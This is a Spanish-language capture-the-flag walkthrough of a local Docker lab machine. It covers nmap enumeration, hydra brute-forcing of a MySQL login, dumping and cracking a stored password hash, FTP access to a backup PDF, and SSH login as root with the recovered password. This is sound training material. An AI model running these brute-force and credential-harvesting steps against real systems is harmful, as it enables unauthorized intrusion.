## DESPLIEGUE DEL DOCKER

Después de desplegar el docker la IP de la máquina es --->172.17.0.2

## FASE DE ENUMERACIÓN

Lo primero vamos a ver que puertos tiene abiertos y que servicios conrren por ellos, así como sus versiones para ver si hay alguna vulnerabilidad.
```bash
nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open -oN PuertosYservicios 172.17.0.2
```
Descripción del comando: 

nmap ejecuta la herramienta de escaneo de red
-sS realiza un escaneo SYN rápido y sigiloso
-sCV detecta servicios y versiones ejecutando scripts predeterminados
-Pn omite el ping y asume que el host está activo
--min-rate 5000 establece una tasa mínima de 5000 paquetes por segundo
-p- escanea todos los puertos del 1 al 65535
-vvv modo muy detallado del escaneo
--open muestra solo los puertos abiertos
-oN PuertosYservicios guarda el resultado en un archivo de texto
172.17.0.2 es la IP del host objetivo

```
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 04:81:76:01:7f:ac:bd:15:ea:2b:24:10:c2:7c:56:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6CZDpuoCIZDYiR9SUlcbeEdpvEjB6MHLMkjm6lH1/jJ5gq+CjwCLdoierDtDiJL66j8Jegm97vxLEL/Pty2cI=
|   256 73:c2:da:cb:47:d7:a9:40:1e:c6:11:bf:09:9c:b2:a3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSaD5RDDNiU4Y284/RlAmpctEMA37q5icAC1fJH5uBU
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Zoo de Capybaras
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   syn-ack ttl 64 MariaDB 5.5.5-10.11.6
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 48
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, ODBCClient, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsCompression, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, InteractiveClient, DontAllowDatabaseTableColumn, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: '1_l![)X`Y|(L(!m$gZp
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
vemos unos cuantos puertos abiertos, el 21 ftp, intento conectarme como anonymous y no me deja, de momento lo descartamos
el 3306 mysql, que sin credenciales no nos deja conectarnos a la base de datos y 22 ssh sin credenciales que tampoco podemos hacer nada.
Vamos al puerto 80 protocolo http, lanzamos un whatweb por si nos reporta alguna información interesante:
```bash
whatweb http://172.17.0.2
```
```
http://172.17.0.2 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[Zoo de Capybaras]
```
nada interesante salvo saber que corre un apache, miramos el código fuente de la página con ctrl+u y no vemos nada interesante, lo único interesante es:

```
Hola Usuario capybara
```
un usuario. Así pùes vamos a ver dónde podemos atacar con un usuario y un diccionario.

## FASE INTRUSIÓN

tenemos un servicio en el puerto 3306 de mysql, lanzamos un ataque de fuerza bruta usando hydra:

```bash
hydra -l capybara -P /usr/share/wordlists/rockyou.txt -t 64 mysql://172.17.0.2 -F -I -V 
```
```
[ATTEMPT] target 172.17.0.2 - login "capybara" - pass "000000" - 23 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "capybara" - pass "michelle" - 24 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "capybara" - pass "tigger" - 25 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "capybara" - pass "sunshine" - 26 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "capybara" - pass "chocolate" - 27 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "capybara" - pass "password1" - 28 of 14344399 [child 1] (0/0)
[3306][mysql] host: 172.17.0.2   login: capybara   password: password1
```
pues tenemos un user y un pass para mysql capybara:password1, vamos a conectarnos a la base de datos:

```bash
mysql -h 172.17.0.2 -u capybara -p --skip-ssl
```
es importante poner la flag --skip-ssl para omitirse el uso de SSL, sino no nos conectará

introducimos el pass cuando lo pida: password1

```
 mysql -h 172.17.0.2 -u capybara -p --skip-ssl                                                                                                                                         

Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 117
Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

ahora vamos a movernos por la base de datos:
usamos el comando " show databases; " para que nos muestre las bases de datos disponibles:

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| beta               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0,001 sec)
```
vemos una interesante llamada beta, ahora con el comando " use + nombre de la base de datos;" usamos esa base de datos (beta en este caso):
```bash
use beta;
```
```
Database changed
MariaDB [beta]> 
```
una vez dentro de la base de datos hay que ver las tablas de las que disponemos con el comando " show tables; "

```bash
MariaDB [beta]> show tables;
+----------------+
| Tables_in_beta |
+----------------+
| registraton    |
+----------------+
1 row in set (0,000 sec)
```
ahora queremos ver toda la información de la tabla registraton "select * from registraton;"
```
MariaDB [beta]> select * from registraton;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | balulero | 520d3142a140addb8be7d858a7e29e15 |
+----+----------+----------------------------------+
1 row in set (0,000 sec)
```

tenemos un user y un hash, voy a probar una pagina de rainbow tables por si existe en sus bases la contraseña,
me voy a :
```bash
https://crackstation.net/
```
```
Hash	Type	Result
520d3142a140addb8be7d858a7e29e15	md2	password1
```
pues ya tenemos un user nuevo y un pass balulero:password1

Probamos por ssh y no nos deja conectarnos así pues probamos ftp:
```bash
 ftp 172.17.0.2
```
```
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:kali): balulero
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
listamos el contenido (ls) y vemos un archivo backup.pdf que nos traemos a nuestra máquina (con get + nombre del archivo):

```
ftp> ls
229 Entering Extended Passive Mode (|||53681|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0           31654 Feb 02 11:21 backup.pdf
226 Directory send OK.
ftp> get backup.pdf
local: backup.pdf remote: backup.pdf
229 Entering Extended Passive Mode (|||11668|)
150 Opening BINARY mode data connection for backup.pdf (31654 bytes).
100% |************************************************************************************************************************************************************************************************| 31654      206.76 MiB/s    00:00 ETA
226 Transfer complete.
31654 bytes received in 00:00 (44.58 MiB/s)
```

es un pdf en el cual leemos: 
```
BACKUP PASSWORD
La contraseña del usuario root es
```
y algo ilegible, hacemos un tratamiento rápido convirtiendo el pdf a imagen (con cualquier pagina online que querais)
y usando este comando:
```bash
convert imagen.jpg -brightness-contrast 10x15 imagen_mejorada.jpg
```

se puede medio leer : 
```
passwordpepinaca
```

pues nos conectamos por ssh como root y el password.
```
 ssh root@172.17.0.2                                                                                                                                                                   
root@172.17.0.2's password: 
```
```
root@29316be1337f:~# id
uid=0(root) gid=0(root) groups=0(root)
```

y hasta aquí esta máquina interesante que después de la intrusión ya somos root ;)
